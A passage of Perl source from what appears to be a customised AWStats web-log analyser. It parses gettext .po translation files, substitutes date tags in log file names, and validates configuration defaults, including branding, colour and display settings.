			if ( $searchdir && !( $searchdir =~ /\/$/ ) && !( $searchdir =~ /\\$/ ) ) {
				$searchdir .= "/";
			}
			
			my $pofile = "${searchdir}awstats-en-us.po";
			if ( -f $pofile ) {
				$FileLang = $pofile;
				last;
			}
		}
	}

	if ($Debug) {
		debug("Call to Read_Language_Data [FileLang=\"$FileLang\"]");
	}

	if ($FileLang) {
		parse_po_file($FileLang);
	}
	else {
		warning( sprintf(
			_t("Warning: Can't find language files for \"%s\". English will be used."),
			$lang
		));
	}

	$PageCode = 'utf-8';
	my @rtl_langs = qw(ar he fa ur ug);
	if ( grep { $_ eq $lang } @rtl_langs ) {
		$PageDir = 1;
	} else {
		$PageDir = 0;
	}

	if ( $LogType eq 'M' ) {
		$translate_map{"First"} = _t("First");
		$translate_map{"Last"} = _t("Last");
		$translate_map{"Mails"} = _t("Mails");
		$translate_map{"Size"} = _t("Size");
	}
}

#------------------------------------------------------------------------------
# Function:     Parse .po file and load messages into memory
# Description:  Reads a GNU gettext .po file (UTF-8 encoded) and populates
#               %translate_map and $Message[] for runtime translation lookups.
#
#               Supports:
#                 - msgid/msgstr pairs
#                 - Multi-line strings (lines starting with double quote)
#                 - Comments (lines starting with #) are ignored
#               Empty msgstr values are silently skipped (no translation).
#
# Parameters:   .po file path
# Output:       %translate_map and $Message array are populated
# Return:       None
# Note:         Assumes UTF-8 input; falls back to English silently on error
#------------------------------------------------------------------------------
sub parse_po_file {
	my ($pofile) = @_;
	my $fh;
	if ( !open($fh, "<:encoding(UTF-8)", $pofile) ) {
		warning("Warning: Cannot open .po file: $pofile");
		return;
	}
	
	my $msgid    = undef;
	my $msgstr   = undef;
	my $in_msgid  = 0;
	my $in_msgstr = 0;
	
	while (<$fh>) {
		chomp;
		next if /^\s*#/;
		next if /^\s*$/;
		
		if (/^msgid\s+"(.*)"/) {
			# 提交上一条记录：原位执行 unescape 逻辑
			if (defined $msgid && defined $msgstr && $msgid ne '') {
				$msgid  =~ s/\\n/\n/g;
				$msgid  =~ s/\\\"/\"/g;
				$msgid  =~ s/\\\\/\\/g;
				$msgstr =~ s/\\n/\n/g;
				$msgstr =~ s/\\\"/\"/g;
				$msgstr =~ s/\\\\/\\/g;
				store_translation($msgid, $msgstr);
			}
			$msgid     = $1;
			$msgstr    = undef;
			$in_msgid  = 1;
			$in_msgstr = 0;
		}
		elsif (/^msgstr\s+"(.*)"/) {
			$msgstr    = $1;
			$in_msgid  = 0;
			$in_msgstr = 1;
		}
		elsif (/^"(.*)"/) {
			if ($in_msgid) {
				$msgid .= $1;
			}
			elsif ($in_msgstr) {
				$msgstr .= $1;
			}
		}
	}
	
	# 保存最后一条滑动的历史翻译记录
	if (defined $msgid && defined $msgstr && $msgid ne '') {
		$msgid  =~ s/\\n/\n/g;
		$msgid  =~ s/\\\"/\"/g;
		$msgid  =~ s/\\\\/\\/g;
		$msgstr =~ s/\\n/\n/g;
		$msgstr =~ s/\\\"/\"/g;
		$msgstr =~ s/\\\\/\\/g;
		store_translation($msgid, $msgstr);
	}
	
	close($fh);
}

#------------------------------------------------------------------------------
# Function:     Store translation in appropriate arrays
# Parameters:	msgid, msgstr
# Output:		$Message array and %translate_map are updated
# Return:		None
#------------------------------------------------------------------------------
sub store_translation {
	my ($msgid, $msgstr) = @_;
	
	$translate_map{$msgid} = $msgstr;
	
	if ( $msgid eq 'PageCode' ) {
		$PageCode = $msgstr;
	}
	elsif ( $msgid eq 'PageDir' ) {
		$PageDir = $msgstr;
	}
}

#------------------------------------------------------------------------------
# Function:     Substitute date/time tags in a string with computed values
# Parameters:   $SourceString - String containing tags like %YYYY-24, %MM-(12)
# Input:        $Debug (debug flag), $starttime (base timestamp), 
#               $now* (current date/time components)
# Output:       None (no global variables modified)
# Return:       String with all tags replaced by formatted date/time values
# Notes:        Tags format: %TAG-offset (offset in hours)
#               Supports YYYY, YY, MM, MO, DD, HH, NS, WM, Wm, WY, Wy, DW, Dw
#               Legacy tags without offset also supported (uses current time)
#------------------------------------------------------------------------------
sub Substitute_Tags {
	my $SourceString = shift;
	if ($Debug) { debug("Call to Substitute_Tags on $SourceString"); }

	my %MonthNumLibEn = (
		"01", "Jan", "02", "Feb", "03", "Mar", "04", "Apr",
		"05", "May", "06", "Jun", "07", "Jul", "08", "Aug",
		"09", "Sep", "10", "Oct", "11", "Nov", "12", "Dec"
	);

	while ( $SourceString =~ /%([ymdhwYMDHWNSO]+)-(\(\d+\)|\d+)/ ) {

		# Accept tag %xx-dd and %xx-(dd)
		my $timetag     = "$1";
		my $timephase   = quotemeta("$2");
		my $timephasenb = "$2";
		$timephasenb =~ s/[^\d]//g;
		if ($Debug) {
			debug( " Found a time tag '$timetag' with a phase of '$timephasenb' hour in log file name",
				1
			);
		}

		# Get older time
		my (
			$oldersec,   $oldermin,  $olderhour, $olderday,
			$oldermonth, $olderyear, $olderwday, $olderyday
		  )
		  = localtime( $starttime - ( $timephasenb * 3600 ) );
		my $olderweekofmonth = int( $olderday / 7 );
		my $olderweekofyear  =
		  int(
			( $olderyday - 1 + 6 - ( $olderwday == 0 ? 6 : $olderwday - 1 ) ) /
			  7 ) + 1;
		if ( $olderweekofyear > 53 ) { $olderweekofyear = 1; }
		my $olderdaymod = $olderday % 7;
		$olderwday++;
		my $olderns =
		  Time::Local::timegm( 0, 0, 0, $olderday, $oldermonth, $olderyear );

		if ( $olderdaymod <= $olderwday ) {
			if ( ( $olderwday != 7 ) || ( $olderdaymod != 0 ) ) {
				$olderweekofmonth = $olderweekofmonth + 1;
			}
		}
		if ( $olderdaymod > $olderwday ) {
			$olderweekofmonth = $olderweekofmonth + 2;
		}

		# Change format of time variables
		$olderweekofmonth = "0$olderweekofmonth";
		if ( $olderweekofyear < 10 ) { $olderweekofyear = "0$olderweekofyear"; }
		if ( $olderyear < 100 ) { $olderyear += 2000; }
		else { $olderyear += 1900; }
		my $oldersmallyear = $olderyear;
		$oldersmallyear =~ s/^..//;
		if ( ++$oldermonth < 10 ) { $oldermonth = "0$oldermonth"; }
		if ( $olderday < 10 )     { $olderday   = "0$olderday"; }
		if ( $olderhour < 10 )    { $olderhour  = "0$olderhour"; }
		if ( $oldermin < 10 )     { $oldermin   = "0$oldermin"; }
		if ( $oldersec < 10 )     { $oldersec   = "0$oldersec"; }

		# Replace tag with new value
		if ( $timetag eq 'YYYY' ) {
			$SourceString =~ s/%YYYY-$timephase/$olderyear/ig;
			next;
		}
		if ( $timetag eq 'YY' ) {
			$SourceString =~ s/%YY-$timephase/$oldersmallyear/ig;
			next;
		}
		if ( $timetag eq 'MM' ) {
			$SourceString =~ s/%MM-$timephase/$oldermonth/ig;
			next;
		}
		if ( $timetag eq 'MO' ) {
			$SourceString =~ s/%MO-$timephase/$MonthNumLibEn{$oldermonth}/ig;
			next;
		}
		if ( $timetag eq 'DD' ) {
			$SourceString =~ s/%DD-$timephase/$olderday/ig;
			next;
		}
		if ( $timetag eq 'HH' ) {
			$SourceString =~ s/%HH-$timephase/$olderhour/ig;
			next;
		}
		if ( $timetag eq 'NS' ) {
			$SourceString =~ s/%NS-$timephase/$olderns/ig;
			next;
		}
		if ( $timetag eq 'WM' ) {
			$SourceString =~ s/%WM-$timephase/$olderweekofmonth/g;
			next;
		}
		if ( $timetag eq 'Wm' ) {
			my $olderweekofmonth0 = $olderweekofmonth - 1;
			$SourceString =~ s/%Wm-$timephase/$olderweekofmonth0/g;
			next;
		}
		if ( $timetag eq 'WY' ) {
			$SourceString =~ s/%WY-$timephase/$olderweekofyear/g;
			next;
		}
		if ( $timetag eq 'Wy' ) {
			my $olderweekofyear0 = sprintf( "%02d", $olderweekofyear - 1 );
			$SourceString =~ s/%Wy-$timephase/$olderweekofyear0/g;
			next;
		}
		if ( $timetag eq 'DW' ) {
			$SourceString =~ s/%DW-$timephase/$olderwday/g;
			next;
		}
		if ( $timetag eq 'Dw' ) {
			my $olderwday0 = $olderwday - 1;
			$SourceString =~ s/%Dw-$timephase/$olderwday0/g;
			next;
		}

		# If unknown tag
		error("Unknown tag '\%$timetag' in parameter.");
	}

	# Replace %YYYY %YY %MM %DD %HH with current value. Kept for backward compatibility.
	$SourceString =~ s/%YYYY/$nowyear/ig;
	$SourceString =~ s/%YY/$nowsmallyear/ig;
	$SourceString =~ s/%MM/$nowmonth/ig;
	$SourceString =~ s/%MO/$MonthNumLibEn{$nowmonth}/ig;
	$SourceString =~ s/%DD/$nowday/ig;
	$SourceString =~ s/%HH/$nowhour/ig;
	$SourceString =~ s/%NS/$nowns/ig;
	$SourceString =~ s/%WM/$nowweekofmonth/g;
	my $nowweekofmonth0 = $nowweekofmonth - 1;
	$SourceString =~ s/%Wm/$nowweekofmonth0/g;
	$SourceString =~ s/%WY/$nowweekofyear/g;
	my $nowweekofyear0 = $nowweekofyear - 1;
	$SourceString =~ s/%Wy/$nowweekofyear0/g;
	$SourceString =~ s/%DW/$nowwday/g;
	my $nowwday0 = $nowwday - 1;
	$SourceString =~ s/%Dw/$nowwday0/g;

	return $SourceString;
}

#------------------------------------------------------------------------------
# Function:     Validate and set default values for all configuration parameters
# Parameters:   None
# Input:        Global configuration variables (may be undefined or invalid)
# Output:       Modifies numerous global configuration variables to ensure 
#               they have valid values (sets defaults, corrects invalid values,
#               processes extra sections, validates dependencies)
# Return:       None
# Notes:        Calls Substitute_Tags on LogFile
#               Validates critical parameters (LogFile, LogFormat, SiteDomain)
#               Creates DirData if CreateDirDataIfNotExists is enabled
#               Errors out on incompatible configurations
#------------------------------------------------------------------------------
sub Check_Config {
	if ($Debug) { debug("Call to Check_Config"); }

	# Show initial values of main parameters before check
	if ($Debug) {
		debug( " LogFile='$LogFile'",           2 );
		debug( " BrandLink='$BrandLink'",       2 );
		debug( " BrandPlatform='$BrandPlatform'",2 );
		debug( " StatsUrl='$StatsUrl'",         2 );
		debug( " LogType='$LogType'",           2 );
		debug( " LogFormat='$LogFormat'",       2 );
		debug( " LogSeparator='$LogSeparator'", 2 );
		debug( " DNSLookup='$DNSLookup'",       2 );
		debug( " DirData='$DirData'",           2 );
		debug( " DirCgi='$DirCgi'",             2 );
		debug( " DirIcons='$DirIcons'",         2 );
		debug( " NotPageList " .    ( join( ',', keys %NotPageList ) ),    2 );
		debug( " ValidHTTPCodes " . ( join( ',', keys %ValidHTTPCodes ) ), 2 );
		debug( " ValidSMTPCodes " . ( join( ',', keys %ValidSMTPCodes ) ), 2 );
		debug( " UseFramesWhenCGI=$UseFramesWhenCGI",     2 );
		debug( " BuildReportFormat=$BuildReportFormat",   2 );
		debug( " BuildHistoryFormat=$BuildHistoryFormat", 2 );
		debug( " URLWithQueryWithOnlyFollowingParameters=" . ( join( ',', @URLWithQueryWithOnly ) ), 2 );
		debug( " URLWithQueryWithoutFollowingParameters=" . ( join( ',', @URLWithQueryWithout ) ), 2 );
	}

	# Main section
	$LogFile = &Substitute_Tags($LogFile);
	if ( !$LogFile ) {
		error("LogFile parameter is not defined in config/domain file");
	}
	if ( $LogType !~ /[WSMF]/i ) { $LogType = 'W'; }
	$LogFormat =~ s/\\//g;
	if ( !$LogFormat ) {
		error("LogFormat parameter is not defined in config/domain file");
	}
	if ( $LogFormat =~ /^\d$/ && $LogFormat !~ /[1-6]/ ) {
		error( "LogFormat parameter is wrong in config/domain file. Value is '$LogFormat' (should be 1,2,3,4,5 or a 'personalized AWStats log format string')"
		);
	}
	$LogSeparator ||= "\\s";
	$DirData      ||= '.';
	$DirCgi       ||= '/cgi-bin';
	$DirIcons     ||= '/icon';
	if ( $DNSLookup !~ /[0-2]/ ) {
		error( "DNSLookup parameter is wrong in config/domain file. Value is '$DNSLookup' (should be 0,1 or 2)"
		);
	}
	if ( !$SiteDomain ) {
		&Read_Language_Data($Lang);
		my $perm_cmd = '';
		if ($^O =~ /win/i) {
			$perm_cmd = _t("Please run as Administrator to set permissions") . ":\n"
					  . "  icacls.exe awstats.pl /grant Everyone:RX";
		} else {
			$perm_cmd = _t("Please set execute permission") . ":\n"
					  . "chmod +x awstats.pl\n\n"
					  . _t("Or if you prefer numeric mode") . ":\n"
					  . "chmod 755 awstats.pl";
		}
		
		error( 
			_t("SiteDomain parameter not defined in your config/domain file, or you may not have execution permission on the file.") . "\n\n" .
			$perm_cmd
		);
	}
	if ( $AllowToUpdateStatsFromBrowser !~ /[0-1]/ ) { $AllowToUpdateStatsFromBrowser = 0; }
	if ( $AllowFullYearView !~ /[0-3]/ ) { $AllowFullYearView = 2; }

	# Optional setup section
	if ( !$SectionsToBeSaved )             { $SectionsToBeSaved   = 'all'; }
	if ( $EnableLockForUpdate !~ /[0-1]/ ) { $EnableLockForUpdate = 0; }
	$DNSStaticCacheFile     ||= 'dnscache.txt';
	$DNSLastUpdateCacheFile ||= 'dnscachelastupdate.txt';
	if ( $DNSStaticCacheFile eq $DNSLastUpdateCacheFile ) {
		error( "DNSStaticCacheFile and DNSLastUpdateCacheFile must have different values." );
	}
	if ( $AllowAccessFromWebToAuthenticatedUsersOnly !~ /[0-1]/ ) { $AllowAccessFromWebToAuthenticatedUsersOnly = 0; }
	if ( $CreateDirDataIfNotExists !~ /[0-1]/ ) { $CreateDirDataIfNotExists = 0; }
	if ( $BuildReportFormat !~ /html|xhtml|xml/i ) { $BuildReportFormat = 'html'; }
	if ( $BuildHistoryFormat !~ /text|xml/ ) { $BuildHistoryFormat = 'text'; }
	if ( $SaveDatabaseFilesWithPermissionsForEveryone !~ /[0-1]/ ) { $SaveDatabaseFilesWithPermissionsForEveryone = 0; }
	if ( $PurgeLogFile !~ /[0-1]/ ) { $PurgeLogFile = 0; }
	if ( $KeepBackupOfHistoricFiles !~ /[0-1]/ ) { $KeepBackupOfHistoricFiles = 0; }
	$DefaultFile[0] ||= 'index.html';
	if ( $AuthenticatedUsersNotCaseSensitive !~ /[0-1]/ ) { $AuthenticatedUsersNotCaseSensitive = 0; }
	if ( $URLNotCaseSensitive !~ /[0-1]/ ) { $URLNotCaseSensitive = 0; }
	if ( $URLWithAnchor !~ /[0-1]/ )       { $URLWithAnchor       = 0; }
	$URLQuerySeparators =~ s/\s//g;
	if ( !$URLQuerySeparators )             { $URLQuerySeparators   = '?;'; }
	if ( $URLWithQuery !~ /[0-1]/ )         { $URLWithQuery         = 0; }
	if ( $URLReferrerWithQuery !~ /[0-1]/ ) { $URLReferrerWithQuery = 0; }
	if ( $WarningMessages !~ /[0-1]/ )      { $WarningMessages      = 1; }
	if ( $DebugMessages !~ /[0-1]/ )        { $DebugMessages        = 0; }

	if ( $NbOfLinesForCorruptedLog !~ /^\d+/ || $NbOfLinesForCorruptedLog < 1 ) { $NbOfLinesForCorruptedLog = 50; }
	if ( $Expires !~ /^\d+/ )   { $Expires  = 0; }
	if ( $DecodeUA !~ /[0-1]/ ) { $DecodeUA = 0; }
	$MiscTrackerUrl ||= '/js/awstats_misc_tracker.js';

	# Optional accuracy setup section
	if ( $LevelForWormsDetection !~ /^\d+/ )  { $LevelForWormsDetection  = 0; }
	if ( $LevelForRobotsDetection !~ /^\d+/ ) { $LevelForRobotsDetection = 2; }
	if ( $LevelForBrowsersDetection !~ /^\w+/ ) { $LevelForBrowsersDetection = 2; }    # Can be 'allphones'
	if ( $LevelForOSDetection !~ /^\d+/ )    { $LevelForOSDetection    = 2; }
	if ( $LevelForRefererAnalyze !~ /^\d+/ ) { $LevelForRefererAnalyze = 2; }
	if ( $LevelForFileTypesDetection !~ /^\d+/ ) { $LevelForFileTypesDetection = 2; }
	if ( $LevelForSearchEnginesDetection !~ /^\d+/ ) { $LevelForSearchEnginesDetection = 2; }
	if ( $LevelForKeywordsDetection !~ /^\d+/ ) { $LevelForKeywordsDetection = 2; }

	# Optional extra setup section
	foreach my $extracpt ( 1 .. @ExtraName - 1 ) {
		if ( $ExtraStatTypes[$extracpt] !~ /[PHBL]/ ) { $ExtraStatTypes[$extracpt] = 'PHBL'; }
		if (   $MaxNbOfExtra[$extracpt] !~ /^\d+$/ || $MaxNbOfExtra[$extracpt] < 0 ) { $MaxNbOfExtra[$extracpt] = 20; }
		if ( $MinHitExtra[$extracpt] !~ /^\d+$/ || $MinHitExtra[$extracpt] < 1 ) { $MinHitExtra[$extracpt] = 1; }
		if ( !$ExtraFirstColumnValues[$extracpt] ) {
			error( "Extra section number $extracpt is defined without ExtraSectionFirstColumnValues$extracpt parameter"
			); }
		if ( !$ExtraFirstColumnFormat[$extracpt] ) { $ExtraFirstColumnFormat[$extracpt] = '%s'; }
	}

	# Optional appearance setup section
	if ( $MaxRowsInHTMLOutput !~ /^\d+/ || $MaxRowsInHTMLOutput < 1 ) { $MaxRowsInHTMLOutput = 1000; }
	if ( $ShowMenu !~ /[01]/ )            { $ShowMenu       = 1; }
	if ( $ShowSummary !~ /[01UVPHB]/ )    { $ShowSummary    = 'UVPHB'; }
	if ( $ShowMonthStats !~ /[01UVPHB]/ ) { $ShowMonthStats = 'UVPHB'; }
	if ( $ShowDaysOfMonthStats !~ /[01VPHB]/ ) { $ShowDaysOfMonthStats = 'VPHB'; }
	if ( $ShowDaysOfWeekStats !~ /[01PHBL]/ ) { $ShowDaysOfWeekStats = 'PHBL'; }
	if ( $ShowHoursStats !~ /[01PHBL]/ )      { $ShowHoursStats      = 'PHBL'; }
	if ( $ShowDomainsStats !~ /[01PHB]/ )     { $ShowDomainsStats    = 'PHB'; }
	if ( $ShowHostsStats !~ /[01PHBL]/ )      { $ShowHostsStats      = 'PHBL'; }
	if ( $ShowAuthenticatedUsers !~ /[01PHBL]/ ) { $ShowAuthenticatedUsers = 0; }
	if ( $ShowRobotsStats !~ /[01HBL]/ )     { $ShowRobotsStats     = 'HBL'; }
	if ( $ShowWormsStats !~ /[01HBL]/ )      { $ShowWormsStats      = 'HBL'; }
	if ( $ShowEMailSenders !~ /[01HBML]/ )   { $ShowEMailSenders    = 0; }
	if ( $ShowEMailReceivers !~ /[01HBML]/ ) { $ShowEMailReceivers  = 0; }
	if ( $ShowSessionsStats !~ /[01]/ )      { $ShowSessionsStats   = 1; }
	if ( $ShowPagesStats !~ /[01PBEX]/i )    { $ShowPagesStats      = 'PBEX'; }
	if ( $ShowFileTypesStats !~ /[01HBC]/ )  { $ShowFileTypesStats  = 'HB'; }
	if ( $ShowDownloadsStats !~ /[01HB]/ )   { $ShowDownloadsStats  = 'HB';}
	if ( $ShowFileSizesStats !~ /[01]/ )     { $ShowFileSizesStats  = 1; }
	if ( $ShowOSStats !~ /[01]/ )            { $ShowOSStats         = 1; }
	if ( $ShowBrowsersStats !~ /[01]/ )      { $ShowBrowsersStats   = 1; }
	if ( $ShowScreenSizeStats !~ /[01]/ )    { $ShowScreenSizeStats = 0; }
	if ( $ShowOriginStats !~ /[01PH]/ )      { $ShowOriginStats     = 'PH'; }
	if ( $ShowKeyphrasesStats !~ /[01]/ )    { $ShowKeyphrasesStats = 1; }
	if ( $ShowKeywordsStats !~ /[01]/ )      { $ShowKeywordsStats   = 1; }
	if ( $ShowClusterStats !~ /[01PHB]/ )    { $ShowClusterStats    = 0; }
	if ( $ShowProtocolStats !~ /[01]/ )      { $ShowProtocolStats = 1; }
	if ( $ShowHTTPErrorsStats !~ /[01]/ )    { $ShowHTTPErrorsStats = 1; }
	if ( $ShowHTTPErrorsPageDetail !~ /[RH]/ ) { $ShowHTTPErrorsPageDetail = 'R'; }
	if ( $ShowSMTPErrorsStats !~ /[01]/ )    { $ShowSMTPErrorsStats = 0; }
	if ( $AddDataArrayMonthStats !~ /[01]/ ) { $AddDataArrayMonthStats = 1; }

	if ( $AddDataArrayShowDaysOfMonthStats !~ /[01]/ ) { $AddDataArrayShowDaysOfMonthStats = 1; }
	if ( $AddDataArrayShowDaysOfWeekStats !~ /[01]/ ) { $AddDataArrayShowDaysOfWeekStats = 1; }
	if ( $AddDataArrayShowHoursStats !~ /[01]/ ) { $AddDataArrayShowHoursStats = 1; }
	my @maxnboflist = (
		'Domain',           'HostsShown',
		'LoginShown',       'RobotShown',
		'WormsShown',       'PageShown',
		'OsShown',          'BrowsersShown',
		'ScreenSizesShown', 'RefererShown',
		'KeyphrasesShown',  'KeywordsShown',
		'EMailsShown',		'DownloadsShown'
	);
	my @maxnboflistdefaultval =
	  ( 10, 10, 10, 10, 5, 10, 10, 10, 5, 10, 10, 10, 20 );
	foreach my $i ( 0 .. ( @maxnboflist - 1 ) ) {
		if (   !$MaxNbOf{ $maxnboflist[$i] }
			|| $MaxNbOf{ $maxnboflist[$i] } !~ /^\d+$/
			|| $MaxNbOf{ $maxnboflist[$i] } < 1 )
		{
			$MaxNbOf{ $maxnboflist[$i] } = $maxnboflistdefaultval[$i];
		}
	}
	my @minhitlist = (
		'Domain',     'Host',  'Login',     'Robot',
		'Worm',       'File',  'Os',        'Browser',
		'ScreenSize', 'Refer', 'Keyphrase', 'Keyword',
		'EMail',	  'Downloads'
	);
	my @minhitlistdefaultval = ( 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 );
	foreach my $i ( 0 .. ( @minhitlist - 1 ) ) {
		if (   !$MinHit{ $minhitlist[$i] }
			|| $MinHit{ $minhitlist[$i] } !~ /^\d+$/
			|| $MinHit{ $minhitlist[$i] } < 1 )
		{
			$MinHit{ $minhitlist[$i] } = $minhitlistdefaultval[$i];
		}
	}
	if ( $FirstDayOfWeek !~ /[01]/ )   { $FirstDayOfWeek   = 1; }
	if ( $UseFramesWhenCGI !~ /[01]/ ) { $UseFramesWhenCGI = 1; }
	if ( $DetailedReportsOnNewWindows !~ /[012]/ ) {
		$DetailedReportsOnNewWindows = 1;
	}
	if ( $ShowLinksOnUrl !~ /[01]/ ) { $ShowLinksOnUrl = 1; }
	if ( $MaxLengthOfShownURL !~ /^\d+/ || $MaxLengthOfShownURL < 1 ) {
		$MaxLengthOfShownURL = 64;
	}
	if ( $ShowLinksToWhoIs !~ /[01]/ ) { $ShowLinksToWhoIs = 0; }
	$Logo          ||= 'awstats_logo6.svg';
	$LogoLink      ||= 'https://www.awstats.org';
	$BrandLink 	   ||= 'https://hestiacp.com';
	$BrandPlatform ||= '';
	$StatsUrl      ||= '';
	my $show_branding = (-f $StatsUrl && -r $StatsUrl);
	# BrandLink 格式验证
	if ( $BrandLink && $BrandLink !~ /^https?:\/\//i ) {
		$BrandLink = "https://$BrandLink";
	}

	# StatsUrl 格式验证
	if ( $StatsUrl && $StatsUrl !~ /^\// ) {
		$StatsUrl = "/$StatsUrl";
	}
	if ( $BarWidth !~ /^\d+/  || $BarWidth < 1 )  { $BarWidth  = 260; }
	if ( $BarHeight !~ /^\d+/ || $BarHeight < 1 ) { $BarHeight = 90; }
	$color_Background =~ s/#//g;
	if ( $color_Background !~ /^[0-9|A-H]+$/i ) {
		$color_Background = 'FFFFFF';
	}
	$color_TableBGTitle =~ s/#//g;

	if ( $color_TableBGTitle !~ /^[0-9|A-H]+$/i ) {
		$color_TableBGTitle = 'CCCCDD';
	}
	$color_TableTitle =~ s/#//g;
	if ( $color_TableTitle !~ /^[0-9|A-H]+$/i ) {
		$color_TableTitle = '000000';
	}
	$color_TableBG =~ s/#//g;
	if ( $color_TableBG !~ /^[0-9|A-H]+$/i ) { $color_TableBG = 'CCCCDD'; }
	$color_TableRowTitle =~ s/#//g;
	if ( $color_TableRowTitle !~ /^[0-9|A-H]+$/i ) {
		$color_TableRowTitle = 'FFFFFF';
	}
	$color_TableBGRowTitle =~ s/#//g;
	if ( $color_TableBGRowTitle !~ /^[0-9|A-H]+$/i ) {
		$color_TableBGRowTitle = 'ECECEC';
	}
	$color_TableBorder =~ s/#//g;
	if ( $color_TableBorder !~ /^[0-9|A-H]+$/i ) {
		$color_TableBorder = 'ECECEC';
	}
	$color_text =~ s/#//g;
	if ( $color_text !~ /^[0-9|A-H]+$/i ) { $color_text = '000000'; }
	$color_textpercent =~ s/#//g;
	if ( $color_textpercent !~ /^[0-9|A-H]+$/i ) {
		$color_textpercent = '606060';
	}
	$color_titletext =~ s/#//g;
	if ( $color_titletext !~ /^[0-9|A-H]+$/i ) { $color_titletext = '000000'; }
	$color_weekend =~ s/#//g;
	if ( $color_weekend !~ /^[0-9|A-H]+$/i ) { $color_weekend = 'EAEAEA'; }
	$color_link =~ s/#//g;
	if ( $color_link !~ /^[0-9|A-H]+$/i ) { $color_link = '0011BB'; }
	$color_hover =~ s/#//g;
	if ( $color_hover !~ /^[0-9|A-H]+$/i ) { $color_hover = '605040'; }
	$color_other =~ s/#//g;
	if ( $color_other !~ /^[0-9|A-H]+$/i ) { $color_other = '666688'; }
	$color_u =~ s/#//g;
	if ( $color_u !~ /^[0-9|A-H]+$/i ) { $color_u = 'FFA060'; }
	$color_v =~ s/#//g;
	if ( $color_v !~ /^[0-9|A-H]+$/i ) { $color_v = 'F4F090'; }
	$color_c =~ s/#//g;
	if ( $color_c !~ /^[0-9|A-H]+$/i ) { $color_c = 'CC88AA'; }
	$color_m =~ s/#//g;
	if ( $color_m !~ /^[0-9|A-H]+$/i ) { $color_m = '88CCAA'; }
	$color_t =~ s/#//g;
	if ( $color_t !~ /^[0-9|A-H]+$/i ) { $color_t = 'AACC88'; }
	$color_p =~ s/#//g;
	if ( $color_p !~ /^[0-9|A-H]+$/i ) { $color_p = '4477DD'; }
	$color_h =~ s/#//g;
	if ( $color_h !~ /^[0-9|A-H]+$/i ) { $color_h = '66EEFF'; }
	$color_k =~ s/#//g;
	if ( $color_k !~ /^[0-9|A-H]+$/i ) { $color_k = '2EA495'; }
	$color_s =~ s/#//g;
	if ( $color_s !~ /^[0-9|A-H]+$/i ) { $color_s = '8888DD'; }
	$color_e =~ s/#//g;
	if ( $color_e !~ /^[0-9|A-H]+$/i ) { $color_e = 'CEC2E8'; }
	$color_x =~ s/#//g;
	if ( $color_x !~ /^[0-9|A-H]+$/i ) { $color_x = 'C1B2E2'; }

	# Correct param if default value is asked
	if ( $ShowSummary            eq '1' ) { $ShowSummary            = 'UVPHB'; }
	if ( $ShowMonthStats         eq '1' ) { $ShowMonthStats         = 'UVPHB'; }
	if ( $ShowDaysOfMonthStats   eq '1' ) { $ShowDaysOfMonthStats   = 'VPHB'; }
	if ( $ShowDaysOfWeekStats    eq '1' ) { $ShowDaysOfWeekStats    = 'PHBL'; }
	if ( $ShowHoursStats         eq '1' ) { $ShowHoursStats         = 'PHBL'; }
	if ( $ShowDomainsStats       eq '1' ) { $ShowDomainsStats       = 'PHB'; }
	if ( $ShowHostsStats         eq '1' ) { $ShowHostsStats         = 'PHBL'; }
	if ( $ShowEMailSenders       eq '1' ) { $ShowEMailSenders       = 'HBML'; }
	if ( $ShowEMailReceivers     eq '1' ) { $ShowEMailReceivers     = 'HBML'; }
	if ( $ShowAuthenticatedUsers eq '1' ) { $ShowAuthenticatedUsers = 'PHBL'; }
	if ( $ShowRobotsStats        eq '1' ) { $ShowRobotsStats        = 'HBL'; }
	if ( $ShowWormsStats         eq '1' ) { $ShowWormsStats         = 'HBL'; }
	if ( $ShowPagesStats         eq '1' ) { $ShowPagesStats         = 'PBEX'; }
	if ( $ShowFileTypesStats     eq '1' ) { $ShowFileTypesStats     = 'HB'; }
	if ( $ShowDownloadsStats     eq '1' ) { $ShowDownloadsStats     = 'HB';}
	if ( $ShowOriginStats        eq '1' ) { $ShowOriginStats        = 'PH'; }
	if ( $ShowClusterStats       eq '1' ) { $ShowClusterStats       = 'PHB'; }
	if ( $ShowProtocolStats !~ /[01]/ ) { $ShowProtocolStats = 1; }

	# Convert extra sections data into @ExtraConditionType, @ExtraConditionTypeVal...
	foreach my $extranum ( 1 .. @ExtraName - 1 ) {
		my $part = 0;
		foreach my $conditioncouple (
			split( /\s*\|\|\s*/, $ExtraCondition[$extranum] ) )
		{
			my ( $conditiontype, $conditiontypeval ) =
			  split( /[,:]/, $conditioncouple, 2 );
			$ExtraConditionType[$extranum][$part] = $conditiontype;
			if ( $conditiontypeval =~ /^REGEX\[(.*)\]$/i ) {
				$conditiontypeval = $1;
			}

			#else { $conditiontypeval=quotemeta($conditiontypeval); }
			$ExtraConditionTypeVal[$extranum][$part] = qr/$conditiontypeval/i;
			$part++;
		}
		$part = 0;
		foreach my $rowkeycouple (
			split( /\s*\|\|\s*/, $ExtraFirstColumnValues[$extranum] ) )
		{
			my ( $rowkeytype, $rowkeytypeval ) =
			  split( /[,:]/, $rowkeycouple, 2 );
			$ExtraFirstColumnValuesType[$extranum][$part] = $rowkeytype;
			if ( $rowkeytypeval =~ /^REGEX\[(.*)\]$/i ) { $rowkeytypeval = $1; }

			#else { $rowkeytypeval=quotemeta($rowkeytypeval); }
			$ExtraFirstColumnValuesTypeVal[$extranum][$part] =
			  qr/$rowkeytypeval/i;
			$part++;
		}
	}

	# Show definitive value for major parameters
	if ($Debug) {
		debug( " LogFile='$LogFile'",               2 );
		debug( " LogFormat='$LogFormat'",           2 );
		debug( " LogSeparator='$LogSeparator'",     2 );
		debug( " DNSLookup='$DNSLookup'",           2 );
		debug( " DirData='$DirData'",               2 );
		debug( " DirCgi='$DirCgi'",                 2 );
		debug( " DirIcons='$DirIcons'",             2 );
		debug( " SiteDomain='$SiteDomain'",         2 );
		debug( " MiscTrackerUrl='$MiscTrackerUrl'", 2 );
		foreach ( keys %MaxNbOf ) { debug( " MaxNbOf{$_}=$MaxNbOf{$_}", 2 ); }
		foreach ( keys %MinHit )  { debug( " MinHit{$_}=$MinHit{$_}",   2 ); }

		foreach my $extranum ( 1 .. @ExtraName - 1 ) {
			debug(
				" ExtraCodeFilter[$extranum] is array "
				  . join( ',', @{ $ExtraCodeFilter[$extranum] } ),
				2
			);
			debug(
				" ExtraConditionType[$extranum] is array "
				  . join( ',', @{ $ExtraConditionType[$extranum] } ),
				2
			);
			debug(
				" ExtraConditionTypeVal[$extranum] is array "
